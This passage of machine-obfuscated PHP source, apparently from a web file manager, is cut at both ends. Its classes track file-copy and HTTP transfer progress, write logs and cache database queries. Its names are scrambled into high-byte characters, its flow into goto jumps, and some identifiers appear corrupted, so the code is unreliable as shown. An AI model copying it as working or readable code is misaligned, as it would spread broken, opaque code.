$Dì´«‡Ó¬Ï[$b³Şç– ‰”[1341]] = $eãÍŒÂ«÷µ; } goto f“šÓÀÀÁ›; dñĞ’‰İ‚î: } public static function valueSet($dŞŠì¨Û‰Å, $DÆ¤£È¦ÔÔ) { goto Aïö–„ñÎØ; E¹š„ğ¾½: Model($eÂ¨¶Ùñ·Ï[395])->add($Cæ‡„§Ã¢¢, array(), !0); goto CÂÓä‡–ˆ·; Aïö–„ñÎØ: $eÂ¨¶Ùñ·Ï =& $_SERVER[÷ÖêïÔÔÓ]; if (!$DÆ¤£È¦ÔÔ) { return Model($eÂ¨¶Ùñ·Ï[395])->where(array($eÂ¨¶Ùñ·Ï[88] => $dŞŠì¨Û‰Å, $eÂ¨¶Ùñ·Ï[29] => $eÂ¨¶Ùñ·Ï[1362]))->delete(); } $B±–İÁßÉä = json_encode($DÆ¤£È¦ÔÔ); goto f“İğ÷¼èÅ; f“İğ÷¼èÅ: if (!$B±–İÁßÉä) { ob_start(); var_dump($DÆ¤£È¦ÔÔ); $cÚ˜»ÜÈâñ = ob_get_clean(); self::log($eÂ¨¶Ùñ·Ï[1363] . json_encode_force($cÚ˜»ÜÈâñ)); } if (!$dŞŠì¨Û‰Å || !$DÆ¤£È¦ÔÔ[$eÂ¨¶Ùñ·Ï[364]]) { return !1; } $Cæ‡„§Ã¢¢ = array($eÂ¨¶Ùñ·Ï[29] => $eÂ¨¶Ùñ·Ï[1362], $eÂ¨¶Ùñ·Ï[1341] => USER_ID, $eÂ¨¶Ùñ·Ï[88] => $dŞŠì¨Û‰Å, $eÂ¨¶Ùñ·Ï[354] => $B±–İÁßÉä); goto E¹š„ğ¾½; CÂÓä‡–ˆ·: } public static function log($eŠÄ†îçÕ”) { write_log($eŠÄ†îçÕ”, $_SERVER[÷ÖêïÔÔÓ][1364]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto D„ß«È¿ğ; fÈ¨óù’ç¡: Hook::bind($Fˆ§ºÒÔØ[1365], array($this, $Fˆ§ºÒÔØ[1366])); Hook::bind($Fˆ§ºÒÔØ[1367], array($this, $Fˆ§ºÒÔØ[1368])); Hook::bind($Fˆ§ºÒÔØ[1369], array($this, $Fˆ§ºÒÔØ[1370])); goto BÅèäŸİ£; Eí‰«ÅË‹: Hook::bind($Fˆ§ºÒÔØ[1378], array($this, $Fˆ§ºÒÔØ[1379])); Hook::bind($Fˆ§ºÒÔØ[1380], array($this, $Fˆ§ºÒÔØ[1381])); Hook::bind($Fˆ§ºÒÔØ[1382], array($this, $Fˆ§ºÒÔØ[1383])); goto B±ˆ†Š; B±ˆ†Š: $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1384]] = LNG($Fˆ§ºÒÔØ[1385]); $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1386]] = 0; $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1387]] = 0; goto c¡Œì‡¬Îˆ; c¡Œì‡¬Îˆ: $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1286]] = $Fˆ§ºÒÔØ[33]; $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1388]] = $Fˆ§ºÒÔØ[33]; $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1389]] = 0; goto DÈ’Üé¸¸í; BÅèäŸİ£: Hook::bind($Fˆ§ºÒÔØ[531], array($this, $Fˆ§ºÒÔØ[1371])); Hook::bind($Fˆ§ºÒÔØ[532], array($this, $Fˆ§ºÒÔØ[1372])); Hook::bind($Fˆ§ºÒÔØ[534], array($this, $Fˆ§ºÒÔØ[1373])); goto d¼™ºŒ°Ë; DÈ’Üé¸¸í: if (!$Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1237]]) { $Aëõ…›Îƒ[$Fˆ§ºÒÔØ[1237]] = LNG($Fˆ§ºÒÔØ[1390]); } goto D¡”âëèÔŠ; C¶˜Şñ¾¾ç: Hook::bind($Fˆ§ºÒÔØ[1375], array($this, $Fˆ§ºÒÔØ[1376])); Hook::bind($Fˆ§ºÒÔØ[524], array($this, $Fˆ§ºÒÔØ[1377])); $this->sourceModelCopyFlag = !1; goto Eí‰«ÅË‹; D„ß«È¿ğ: $Fˆ§ºÒÔØ =& $_SERVER[÷ÖêïÔÔÓ]; $Aëõ…›Îƒ =& $this->task; $this->sourceCopyFolder = !1; goto fÈ¨óù’ç¡; d¼™ºŒ°Ë: Hook::bind($Fˆ§ºÒÔØ[535], array($this, $Fˆ§ºÒÔØ[1373])); Hook::bind($Fˆ§ºÒÔØ[502], array($this, $Fˆ§ºÒÔØ[1374])); Hook::bind($Fˆ§ºÒÔØ[499], array($this, $Fˆ§ºÒÔØ[1374])); goto AÀó±Ì„›; AÀó±Ì„›: Hook::bind($Fˆ§ºÒÔØ[504], array($this, $Fˆ§ºÒÔØ[1374])); Hook::bind($Fˆ§ºÒÔØ[506], array($this, $Fˆ§ºÒÔØ[1374])); Hook::bind($Fˆ§ºÒÔØ[508], array($this, $Fˆ§ºÒÔØ[1374])); goto C¶˜Şñ¾¾ç; D¡”âëèÔŠ: } protected function endAfter() { goto b‰¯ÀÈ‹ñš; d”‹¬…Ìì: Hook::unbind($BÉÂ®Ö·ù[534], array($this, $BÉÂ®Ö·ù[1373])); Hook::unbind($BÉÂ®Ö·ù[535], array($this, $BÉÂ®Ö·ù[1373])); Hook::unbind($BÉÂ®Ö·ù[502], array($this, $BÉÂ®Ö·ù[1374])); goto e³ÏÏ×—¢; e³ÏÏ×—¢: Hook::unbind($BÉÂ®Ö·ù[499], array($this, $BÉÂ®Ö·ù[1374])); Hook::unbind($BÉÂ®Ö·ù[504], array($this, $BÉÂ®Ö·ù[1374])); Hook::unbind($BÉÂ®Ö·ù[506], array($this, $BÉÂ®Ö·ù[1374])); goto A±‰Ÿå×ó“; b‰¯ÀÈ‹ñš: $BÉÂ®Ö·ù =& $_SERVER[÷ÖêïÔÔÓ]; Hook::unbind($BÉÂ®Ö·ù[1365], array($this, $BÉÂ®Ö·ù[1366])); Hook::unbind($BÉÂ®Ö·ù[1367], array($this, $BÉÂ®Ö·ù[1368])); goto c“—ÅÌÂèŞ; A±‰Ÿå×ó“: Hook::unbind($BÉÂ®Ö·ù[508], array($this, $BÉÂ®Ö·ù[1374])); Hook::unbind($BÉÂ®Ö·ù[1375], array($this, $BÉÂ®Ö·ù[1376])); Hook::unbind($BÉÂ®Ö·ù[524], array($this, $BÉÂ®Ö·ù[1377])); goto AŸ¿–‚âÔ‹; AŸ¿–‚âÔ‹: Hook::unbind($BÉÂ®Ö·ù[1378], array($this, $BÉÂ®Ö·ù[1379])); Hook::unbind($BÉÂ®Ö·ù[1380], array($this, $BÉÂ®Ö·ù[1381])); Hook::unbind($BÉÂ®Ö·ù[1382], array($this, $BÉÂ®Ö·ù[1383])); goto A’‹¡Áá—›; c“—ÅÌÂèŞ: Hook::unbind($BÉÂ®Ö·ù[1369], array($this, $BÉÂ®Ö·ù[1370])); Hook::unbind($BÉÂ®Ö·ù[531], array($this, $BÉÂ®Ö·ù[1371])); Hook::unbind($BÉÂ®Ö·ù[532], array($this, $BÉÂ®Ö·ù[1372])); goto d”‹¬…Ìì; A’‹¡Áá—›: } public function copyMoveStart($A‹§Ô ñ¾‘, $AŒÂÉŠÜŒ§, $aÌä÷®Î§, $C·™Ã»î«Ì) { } public function updateAfter() { goto D“¼…Õñ; Fß¤‰„ÖÄÁ: $f‘ä£Œà[$aÁªË ³Ò¬[1342]] = ($f‘ä£Œà[$aÁªË ³Ò¬[1391]] + $c¼œéÉ‚ÂÍ) / $f‘ä£Œà[$aÁªË ³Ò¬[684]]; if ($f‘ä£Œà[$aÁªË ³Ò¬[1342]] > 0) { $C‡Ñç÷…óÜ = timeFloat() - $f‘ä£Œà[$aÁªË ³Ò¬[1344]] - $f‘ä£Œà[$aÁªË ³Ò¬[1347]]; $f‘ä£Œà[$aÁªË ³Ò¬[1348]] = $C‡Ñç÷…óÜ * (1 - $f‘ä£Œà[$aÁªË ³Ò¬[1342]]) / $f‘ä£Œà[$aÁªË ³Ò¬[1342]]; } goto f’àË­ƒ·Â; a¥Ã‚Óò†: if ($this->sourceModelCopyFlag) { return; } $c¼œéÉ‚ÂÍ = 0; if ($f‘ä£Œà[$aÁªË ³Ò¬[1388]] == $aÁªË ³Ò¬[1014]) { $c¼œéÉ‚ÂÍ = $f‘ä£Œà[$aÁªË ³Ò¬[1387]] * 0.5; } else { if ($f‘ä£Œà[$aÁªË ³Ò¬[1388]] == $aÁªË ³Ò¬[90]) { $c¼œéÉ‚ÂÍ = $f‘ä£Œà[$aÁªË ³Ò¬[1387]] * 0.5 + $f‘ä£Œà[$aÁªË ³Ò¬[1386]] * 0.5; } } goto Fß¤‰„ÖÄÁ; D“¼…Õñ: $aÁªË ³Ò¬ =& $_SERVER[÷ÖêïÔÔÓ]; $f‘ä£Œà =& $this->task; if (!$f‘ä£Œà[$aÁªË ³Ò¬[684]]) { return; } goto a¥Ã‚Óò†; f’àË­ƒ·Â: } public function addPath($Dä½Ÿ£Œ¢¢) { goto fïõÔÛ²¼ß; e‡·±“Ø§Í: $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[684]] += $B›Õèà¶[$Eº¿‘ÅĞ‘•[78]]; $this->update(); goto cÁˆæÁä©á; fïõÔÛ²¼ß: $Eº¿‘ÅĞ‘• =& $_SERVER[÷ÖêïÔÔÓ]; $CõàéñÅ‘µ =& $this->task; $B›Õèà¶ = IO::infoWithChildren($Dä½Ÿ£Œ¢¢); goto c®ÎïãÂ†; c®ÎïãÂ†: $FÈ‚àí· = $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1392]] ? $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1392]][$Eº¿‘ÅĞ‘•[1393]] : 0; $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1392]] = array($Eº¿‘ÅĞ‘•[1393] => $FÈ‚àí· + 1, $Eº¿‘ÅĞ‘•[383] => $B›Õèà¶[$Eº¿‘ÅĞ‘•[28]], $Eº¿‘ÅĞ‘•[76] => $B›Õèà¶[$Eº¿‘ÅĞ‘•[76]], $Eº¿‘ÅĞ‘•[462] => $B›Õèà¶[$Eº¿‘ÅĞ‘•[462]] ? $B›Õèà¶[$Eº¿‘ÅĞ‘•[462]] : $B›Õèà¶[$Eº¿‘ÅĞ‘•[76]]); if ($B›Õèà¶[$Eº¿‘ÅĞ‘•[29]] == $Eº¿‘ÅĞ‘•[164]) { $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1284]] += 1; } else { $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1284]] += $B›Õèà¶[$Eº¿‘ÅĞ‘•[81]][$Eº¿‘ÅĞ‘•[79]]; if ($B›Õèà¶[$Eº¿‘ÅĞ‘•[366]]) { $CõàéñÅ‘µ[$Eº¿‘ÅĞ‘•[1284]] += $B›Õèà¶[$Eº¿‘ÅĞ‘•[81]][$Eº¿‘ÅĞ‘•[80]] + 1; } } goto e‡·±“Ø§Í; cÁˆæÁä©á: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E”¯à’ÌŠ) { $FİÒ‘†‡”Ê =& $_SERVER[÷ÖêïÔÔÓ]; $C¦ÕõèÅê× =& $this->task; $C¦ÕõèÅê×[$FİÒ‘†‡”Ê[1384]] = $E”¯à’ÌŠ[$FİÒ‘†‡”Ê[28]]; $C¦ÕõèÅê×[$FİÒ‘†‡”Ê[1286]] = $E”¯à’ÌŠ[$FİÒ‘†‡”Ê[28]]; $this->update(); } public function copyFileStart($cÈ½ÕŠâ…Ë, $f ³¹¤Ş, $Dì¸Õâ”ƒó, $Bô†•“ÅÏ°, $DÃã‘Î—×, $d‰ï·’»·) { goto Dˆ‘²‹›¦ğ; Dˆ‘²‹›¦ğ: $E³²ºàÊ« =& $_SERVER[÷ÖêïÔÔÓ]; $f‘ÈÒ¦Œ×Ş = $DÃã‘Î—×; if ($f‘ÈÒ¦Œ×Ş == $GLOBALS[$E³²ºàÊ«[1394]]) { $f‘ÈÒ¦Œ×Ş = $GLOBALS[$E³²ºàÊ«[1395]]; } goto AµºŠ¶¹ì½; FÎçíë§‘›: $fÜî¬ò¬[$E³²ºàÊ«[1384]] = $f‘ÈÒ¦Œ×Ş; $fÜî¬ò¬[$E³²ºàÊ«[1386]] = (int) $cÈ½ÕŠâ…Ë->size($f ³¹¤Ş); $fÜî¬ò¬[$E³²ºàÊ«[1387]] = 0; goto a¹¹¢Å‰Ù; AµºŠ¶¹ì½: $GLOBALS[$E³²ºàÊ«[1395]] = $DÃã‘Î—×; $GLOBALS[$E³²ºàÊ«[1394]] = $d‰ï·’»·; $fÜî¬ò¬ =& $this->task; goto FÎçíë§‘›; BŒò Õ‡‡™: $this->update(); goto c³Àñù”Ò—; a¹¹¢Å‰Ù: $fÜî¬ò¬[$E³²ºàÊ«[1286]] = $E³²ºàÊ«[33]; $fÜî¬ò¬[$E³²ºàÊ«[1388]] = $E³²ºàÊ«[33]; $fÜî¬ò¬[$E³²ºàÊ«[1389]] = 0; goto BŒò Õ‡‡™; c³Àñù”Ò—: } public function copyFileEnd($dÛ­®Í²”, $c´Ş›‚Èî·, $e«¢×Íİ“©, $aŠ¨³å†ã™, $eÖº• §‰ô, $F¸ØÁ”¬É´) { $C’Ñ¿¯Ñ”ˆ =& $_SERVER[÷ÖêïÔÔÓ]; $C•¶£‚öã¨ =& $this->task; $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1387]] = $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1386]]; $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1388]] = $C’Ñ¿¯Ñ”ˆ[33]; if ($eÖº• §‰ô == $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1384]]) { $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1391]] += $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1386]]; $this->update(1); } else { $this->update(); $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1387]] = 0; } self::log($C’Ñ¿¯Ñ”ˆ[1396] . $c´Ş›‚Èî· . $C’Ñ¿¯Ñ”ˆ[67] . $aŠ¨³å†ã™ . $C’Ñ¿¯Ñ”ˆ[214] . $eÖº• §‰ô . $C’Ñ¿¯Ñ”ˆ[1397] . $C•¶£‚öã¨[$C’Ñ¿¯Ñ”ˆ[1384]]); } public function updateFileEnd($A†ù–á˜ŸŠ, $f‘ëøŞš†) { $Dó¡õ„Ó‚– =& $_SERVER[÷ÖêïÔÔÓ]; $c¾Á²ï‡âÓ =& $this->task; $c¾Á²ï‡âÓ[$Dó¡õ„Ó‚–[1384]] = $A†ù–á˜ŸŠ; $c¾Á²ï‡âÓ[$Dó¡õ„Ó‚–[1386]] = $f‘ëøŞš†; $c¾Á²ï‡âÓ[$Dó¡õ„Ó‚–[1391]] += $f‘ëøŞš†; $this->update(1); } public function sourceModelCopy($dØŒİµ·ˆ) { goto c¿ÄİƒõÊ…; c¿ÄİƒõÊ…: $Dã‹‡¼©ğÌ =& $_SERVER[÷ÖêïÔÔÓ]; $dˆƒ•ëÍ›ø = $dØŒİµ·ˆ[0]; $AÎÓ¬ôµ•³ = $dØŒİµ·ˆ[1]; goto fßåô…´‡™; fßåô…´‡™: $eƒÖ¿ÔÅÁ¸ =& $this->task; $this->sourceModelCopyFlag = !0; $b”ÓÍ†¹œó = 0; goto Dà”öŒ¨ø×; Dà”öŒ¨ø×: switch ($dˆƒ•ëÍ›ø) { case $Dã‹‡¼©ğÌ[500]: $b”ÓÍ†¹œó = 1; break; case $Dã‹‡¼©ğÌ[503]: $eƒÖ¿ÔÅÁ¸[$Dã‹‡¼©ğÌ[1384]] = $AÎÓ¬ôµ•³[$Dã‹‡¼©ğÌ[28]]; break; case $Dã‹‡¼©ğÌ[505]: $b”ÓÍ†¹œó = intval($dØŒİµ·ˆ[$Dã‹‡¼©ğÌ[360]] * 0.4); break; case $Dã‹‡¼©ğÌ[507]: $b”ÓÍ†¹œó = intval($dØŒİµ·ˆ[$Dã‹‡¼©ğÌ[360]] * 0.2); break; case $Dã‹‡¼©ğÌ[509]: $b”ÓÍ†¹œó = intval($dØŒİµ·ˆ[$Dã‹‡¼©ğÌ[360]] * 0.4); break; } $this->update($b”ÓÍ†¹œó); $this->sourceModelCopyFlag = !1; goto AŒ·¯µĞøË; AŒ·¯µĞøË: } public function sourceRemove($D´ÈÚ¹î¥°, $c±„É¯¸») { $aâ…§¨Ÿ£Œ =& $_SERVER[÷ÖêïÔÔÓ]; $this->sourceModelCopyFlag = !0; $f±§Âñ²§š = 1; if (isset($D´ÈÚ¹î¥°[$aâ…§¨Ÿ£Œ[81]])) { $f±§Âñ²§š = $D´ÈÚ¹î¥°[$aâ…§¨Ÿ£Œ[81]][$aâ…§¨Ÿ£Œ[79]] + $D´ÈÚ¹î¥°[$aâ…§¨Ÿ£Œ[81]][$aâ…§¨Ÿ£Œ[80]] + 1; } $this->update($f±§Âñ²§š); $this->sourceModelCopyFlag = !1; } public function sourceMove($bª¸ÁŸÃ›¥) { $this->sourceRemove($bª¸ÁŸÃ›¥, !1); } public function curlProgress($a¯Êí©Ãè, $eáİó´Ûï, $aƒ‘¨ë‹Œ, $Eˆ´¿É°¿Å, $a¸±´¥ÖŞÃ) { $cŒ¤Ôå¬Åø =& $_SERVER[÷ÖêïÔÔÓ]; $E¨˜ Æ‹¶¾ =& $this->task; if ($a¸±´¥ÖŞÃ > 0) { $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1286]] = $cŒ¤Ôå¬Åø[1398]; $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1388]] = $cŒ¤Ôå¬Åø[90]; if ($E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1386]] == $Eˆ´¿É°¿Å || $Eˆ´¿É°¿Å > 1024 * 1024) { $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1387]] = $a¸±´¥ÖŞÃ; } if ($E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1389]]) { $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1387]] = $a¸±´¥ÖŞÃ + $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1389]]; } } else { if ($aƒ‘¨ë‹Œ > 0) { if ($E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1386]] == $eáİó´Ûï) { $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1387]] = $aƒ‘¨ë‹Œ; $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1286]] = $cŒ¤Ôå¬Åø[1399]; $E¨˜ Æ‹¶¾[$cŒ¤Ôå¬Åø[1388]] = $cŒ¤Ôå¬Åø[1014]; } } } $this->update(); } public function curlProgressStart($AÚ‹»åæµˆ) { } public function curlProgressEnd($dçÕ–‹¿‰à) { $Bõõ¨¶­‰¡ =& $_SERVER[÷ÖêïÔÔÓ]; $bÄˆøÁæ…é =& $this->task; $Eß¡è¥Íë² = curl_getinfo($dçÕ–‹¿‰à); $Fí†ƒ“ÛŞ = $Eß¡è¥Íë²[$Bõõ¨¶­‰¡[1400]]; if ($bÄˆøÁæ…é[$Bõõ¨¶­‰¡[1388]] == $Bõõ¨¶­‰¡[90] && $Fí†ƒ“ÛŞ) { $bÄˆøÁæ…é[$Bõõ¨¶­‰¡[1389]] += $Fí†ƒ“ÛŞ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $BšÄËÅ²œ¥ =& $_SERVER[÷ÖêïÔÔÓ]; Hook::bind($BšÄËÅ²œ¥[1378], array($this, $BšÄËÅ²œ¥[1401])); Hook::bind($BšÄËÅ²œ¥[1380], array($this, $BšÄËÅ²œ¥[1402])); Hook::bind($BšÄËÅ²œ¥[1382], array($this, $BšÄËÅ²œ¥[1403])); } protected function endAfter() { $fÙ¦¥ÊÄ× =& $_SERVER[÷ÖêïÔÔÓ]; Hook::unbind($fÙ¦¥ÊÄ×[1378], array($this, $fÙ¦¥ÊÄ×[1401])); Hook::unbind($fÙ¦¥ÊÄ×[1380], array($this, $fÙ¦¥ÊÄ×[1402])); Hook::unbind($fÙ¦¥ÊÄ×[1382], array($this, $fÙ¦¥ÊÄ×[1403])); } public function progressStart($EíÌå¢ ä¡) { $eàªÒ©öÜä =& $_SERVER[÷ÖêïÔÔÓ]; $fÏ±Ò²à‹ = curl_getinfo($EíÌå¢ ä¡); self::log($eàªÒ©öÜä[1404] . $fÏ±Ò²à‹[$eàªÒ©öÜä[292]]); self::valueSet($this->task[$eàªÒ©öÜä[364]], $this->task); } public function progressEnd($D…¹³ÚœÏŠ) { $Dİ¿Í¢ÜÇÄ =& $_SERVER[÷ÖêïÔÔÓ]; self::log($Dİ¿Í¢ÜÇÄ[1405] . $this->task[$Dİ¿Í¢ÜÇÄ[364]]); $this->end(); } public function progress($Eµ–ßÀ×ì, $Cà•†‹¾ïò, $F‰ †ç ë¬, $F‚Œ¡ìğê‹, $D§É…Ìœ¥Ú) { $b¿­áÒ´Ùã =& $_SERVER[÷ÖêïÔÔÓ]; $bˆ‘¦ğùÃÛ =& $this->task; if ($D§É…Ìœ¥Ú > 0) { $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]] = $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]] == 0 ? $F‚Œ¡ìğê‹ : $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]]; $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1289]] = $D§É…Ìœ¥Ú; } else { if ($F‰ †ç ë¬ > 0) { $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]] = $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]] == 0 ? $Cà•†‹¾ïò : $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1284]]; $bˆ‘¦ğùÃÛ[$b¿­áÒ´Ùã[1289]] = $F‰ †ç ë¬; } } $this->update(); self::log("\x70\162\x6f\147\162\145\163\x73\110\164\x74\160\72\144\157\x77\156\x3a{$F‰ †ç ë¬}\x2f{$Cà•†‹¾ïò}\73\40\x75\160\x6c\x6f\x61\x64\x3a{$D§É…Ìœ¥Ú}\57{$F‚Œ¡ìğê‹}\73"); } } goto Aõ¤«Šˆ; f¬ù•–µ†: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\151\155\x65", "\164\151\x6d\x65", "\151\156\163\145\x72\164\54\x75\160\x64\141\164\x65", "\146\x75\156\x63\164\x69\157\x6e"), array("\x63\x72\x65\141\164\145\124\151\155\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\156")); public function setDataAuto($CĞ¬ªùìğâ) { $this->dataAuto = $CĞ¬ªùìğâ; } public function __construct($eÌ‘çÚï¥Ù = '', $DŞÇÀ‹‰à‘ = '', $bê×ÚªÓªã = '') { parent::__construct($eÌ‘çÚï¥Ù, $DŞÇÀ‹‰à‘, $bê×ÚªÓªã); } static function textEncode($aÎˆ¾ÒŸóÓ) { $A”é¢ƒÏò® =& $_SERVER[÷ÖêïÔÔÓ]; if (!$aÎˆ¾ÒŸóÓ) { return $A”é¢ƒÏò®[33]; } $fÈ¨õë—©ˆ = json_encode($aÎˆ¾ÒŸóÓ); $fÈ¨õë—©ˆ = preg_replace_callback($A”é¢ƒÏò®[338], function ($CÙÀ´¨†˜) { return addslashes($CÙÀ´¨†˜[0]); }, $fÈ¨õë—©ˆ); return json_decode($fÈ¨õë—©ˆ); } static function textDecode($DßÚ†Ç°§Œ) { $AîåŞÙ»Î¾ =& $_SERVER[÷ÖêïÔÔÓ]; $Aê¢ÈÅÀÏÈ = json_encode($DßÚ†Ç°§Œ); $Aê¢ÈÅÀÏÈ = preg_replace_callback($AîåŞÙ»Î¾[339], function ($a…Ûå¼Ó½ä) { return $_SERVER[÷ÖêïÔÔÓ][94]; }, $Aê¢ÈÅÀÏÈ); return json_decode($Aê¢ÈÅÀÏÈ); } protected $tableMeta = array(); protected function _beforeInsert(&$a¬© õ×²Ì, $aäƒò¦¥íË) { $dˆÃ‰°èé =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->checkDataAutoHas($dˆÃ‰°èé[340])) { return; } $this->dataBeforeFilter($a¬© õ×²Ì, $dˆÃ‰°èé[340]); } protected function _beforeUpdate(&$BãËàÆëÓ, $c†ö¨²ğ) { $a­ÇÏºãÖ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->checkDataAutoHas($a­ÇÏºãÖ[341])) { return; } $this->dataBeforeFilter($BãËàÆëÓ, $a­ÇÏºãÖ[341]); } protected function _afterSelect(&$d¥Åš‘õÜ®, $fš¯ù÷) { if (!is_array($d¥Åš‘õÜ®)) { return; } if (!$this->checkDataAutoHas($_SERVER[÷ÖêïÔÔÓ][342])) { return; } foreach ($d¥Åš‘õÜ® as &$DÌßæñÕÚ) { $this->dataAfterFilter($DÌßæñÕÚ); } } protected function _afterFind(&$bÒÄ½½ª‹è, $BíÇŠ»ˆùÏ) { if (!is_array($bÒÄ½½ª‹è)) { return; } if (!$this->checkDataAutoHas($_SERVER[÷ÖêïÔÔÓ][342])) { return; } $this->dataAfterFilter($bÒÄ½½ª‹è); } public function setAutoIncrement($D´àº¿íê) { $E´»Òíëá = array($this->getPk() => $D´àº¿íê); $Aí«ƒ¤˜§ = $this->data($E´»Òíëá)->add(); if ($Aí«ƒ¤˜§) { $this->delete($Aí«ƒ¤˜§); } } public function getAutoIncrement() { $Cç†ÃšÕãå = $this->getTableName(); $F¬àˆƒòé = $this->max($this->getPk()); $BñÜ‡ß­× = $this->query("\163\x68\x6f\x77\40\164\141\142\x6c\x65\40\163\x74\141\x74\165\x73\x20\167\x68\x65\x72\x65\x20\x4e\x61\x6d\x65\x3d\x27{$Cç†ÃšÕãå}\47"); $EóŠ®Èª›Ë = $BñÜ‡ß­×[0][$_SERVER[÷ÖêïÔÔÓ][343]]; $E”Ş²µææ¢ = max($F¬àˆƒòé, $EóŠ®Èª›Ë); return $E”Ş²µææ¢; } protected function _callBefore($Eâö¥Ï¾ç, $Fâ¯²ø­’Í) { return $this->cacheCallCheck($Eâö¥Ï¾ç, $Fâ¯²ø­’Í, !1); } protected function _callAfter($C¦óİ‹ÜŒÆ, $Ešòİù·å) { return $this->cacheCallCheck($C¦óİ‹ÜŒÆ, $Ešòİù·å, !0); } protected function cacheFunctionAlias($D³‰¡‘Ë²Ù) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fÖ—ìÓ¾, $eÎ«¼†–í±, $fä¡ŞŒë = false) { $DİåŠ¨³Ê® = $this->cacheFunctionAlias($eÎ«¼†–í±); if (!$DİåŠ¨³Ê®) { return; } foreach ($DİåŠ¨³Ê® as $d¦»‚½ç => $AğŒ×‚«Åâ) { $CÂº®ë¬Ä© = $AğŒ×‚«Åâ[0]; $c£øĞ¿Éæ = explode($_SERVER[÷ÖêïÔÔÓ][47], $AğŒ×‚«Åâ[1]); if ($fÖ—ìÓ¾ == $d¦»‚½ç) { return $this->cacheFunctionGet($d¦»‚½ç, $CÂº®ë¬Ä©); } if ($fä¡ŞŒë && in_array($fÖ—ìÓ¾, $c£øĞ¿Éæ)) { $this->cacheFunctionClear($d¦»‚½ç, $CÂº®ë¬Ä©); } } } public function cacheFunctionGet($a®‹ÙâÒ‡‚, $b‡Â±ëÙë) { $f®Å²¦Šàñ = $this->cacheKeyMake($a®‹ÙâÒ‡‚, $b‡Â±ëÙë); $Bß®Ô‡ñÖ = Cache::get($f®Å²¦Šàñ); if (!is_array($Bß®Ô‡ñÖ)) { $Bß®Ô‡ñÖ = call_user_func_array(array($this, $a®‹ÙâÒ‡‚), array($b‡Â±ëÙë, !0)); Cache::set($f®Å²¦Šàñ, $Bß®Ô‡ñÖ); } return $Bß®Ô‡ñÖ; } public function cacheFunctionClear($BœÓÜÇ‘‹, $Bâ¶·µ ÎÚ) { $AÉï²ÖÍ§’ = $Bâ¶·µ ÎÚ; if (!is_array($Bâ¶·µ ÎÚ)) { $AÉï²ÖÍ§’ = array($Bâ¶·µ ÎÚ); } foreach ($AÉï²ÖÍ§’ as $a„õƒ¸šŠÏ) { $eô´»‰ÖŒø = $this->cacheKeyMake($BœÓÜÇ‘‹, $a„õƒ¸šŠÏ); Cache::remove($eô´»‰ÖŒø); } } private function cacheKeyMake($A½¸²¢éãš, $E¢òä§ùª) { $b¿øÍ‡Î—” =& $_SERVER[÷ÖêïÔÔÓ]; return get_class($this) . $b¿øÍ‡Î—”[71] . $A½¸²¢éãš . $b¿øÍ‡Î—”[344] . $E¢òä§ùª; } protected function selectPage($dÎ­Ò‚Áö» = 200, $FæÕÃ½İÔ = 1) { goto eÇ´ëŸÈ¡; b…¯ºò¥÷: $aƒÚÃ šÈğ = array($Eˆö·„ç±Ò[347] => array($Eˆö·„ç±Ò[348] => $E‡îæà¸†æ, $Eˆö·„ç±Ò[345] => $dÎ­Ò‚Áö», $Eˆö·„ç±Ò[336] => $FæÕÃ½İÔ, $Eˆö·„ç±Ò[349] => $fè¦–åæ‰), $Eˆö·„ç±Ò[350] => $EÁµ¹ÄÑ ? $EÁµ¹ÄÑ : array()); return $aƒÚÃ šÈğ; goto Bƒƒ¼Õ¢–; eÇ´ëŸÈ¡: $Eˆö·„ç±Ò =& $_SERVER[÷ÖêïÔÔÓ]; global $in; $Eƒã¨„Ç = $this->optionsValue(); goto 